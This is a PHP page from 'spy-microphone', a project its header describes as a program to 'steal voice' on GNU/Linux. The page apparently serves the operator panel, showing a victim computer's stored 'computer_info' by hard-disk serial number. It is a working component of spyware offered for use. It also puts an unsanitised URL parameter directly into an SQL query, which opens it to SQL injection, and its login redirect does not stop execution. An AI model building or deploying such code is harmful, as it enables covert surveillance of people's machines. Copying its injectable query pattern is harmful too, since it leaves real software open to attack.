<?php

#
# Copyright (c) 2018 Barchampas Gerasimos <makindosx@gmail.com>
# spy-microphone is a program for steal voice in gnu/linux OS.
#
# spy-microphone is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
#
# spy-microphone is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License, version 3,
# along with this program.  If not, see <http://www.gnu.org/licenses/>
#

session_start();

 if (!isset($_SESSION['login']))
    {
      header("Location: index.php");
      }

      else
       {

if(isset($_GET['serial_number']))
   {


    $hard_disk_id_serial_number = $_GET['serial_number'];

   
    if(!$hard_disk_id_serial_number) 
     {
        die('The hard_disk_id_serial_number is invalid!');
      }


    else 
      {

      
         require_once('__ROOT__/connect.php');

            if (class_exists('DATABASE_CONNECT'))
            {
 
             $obj_conn  = new DATABASE_CONNECT;
            
             $host = $obj_conn->connect[0];
             $user = $obj_conn->connect[1];
             $pass = $obj_conn->connect[2];
             $db   = $obj_conn->connect[3];
 
            $conn = new mysqli($host,$user,$pass,$db);
 
             if ($conn->connect_error)
                   {
                    die ("Cannot connect " .$conn->connect_error);
                    }

               else
                {

   

        $sql = "select computer_info from records 
                 where hard_disk_id_serial_number = '$hard_disk_id_serial_number'
                 group by hard_disk_id_serial_number";
        $result = $conn->query($sql);
                 

         while($row = $result->fetch_assoc())  
          {

           $computer_info = $row['computer_info'];

            header('Content-Type: text/plain');
           echo $computer_info;    
     


           } // end of while

           
          } // end of else connect  

  
          } //end of exists connect  


 
       }  // end of else isset 

 
    } // end of coif isset


   } // end else session login

?>
